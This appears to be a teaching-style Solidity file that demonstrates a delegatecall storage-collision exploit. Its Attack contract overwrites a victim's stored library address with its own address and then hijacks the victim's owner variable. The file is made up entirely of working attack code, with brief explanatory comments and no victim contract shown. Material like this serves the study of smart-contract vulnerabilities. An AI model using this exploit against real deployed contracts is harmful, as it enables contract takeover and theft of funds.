// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;

contract Lib {
    uint public someNumber;

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract Attack {
    address public lib;
    address public owner;
    uint public someNumber;

    function attack(address _victim) public {
        // address is construced of 20 bytes (160 bits).
        // we typecast it to uint160 then to uint256
        // first time we will call and change the address of Lib Contract to our contract
        _victim.call(
            abi.encodeWithSignature(
                "doSomething(uint256)",
                uint(uint160(address(this)))
            )
        );

        // now this line will call doSomething in our contract and change the owner to msg.sender
        _victim.call(abi.encodeWithSignature("doSomething(uint256)", 1));
    }

    function doSomething(uint256 _num) public {
        owner = msg.sender;
    }
}

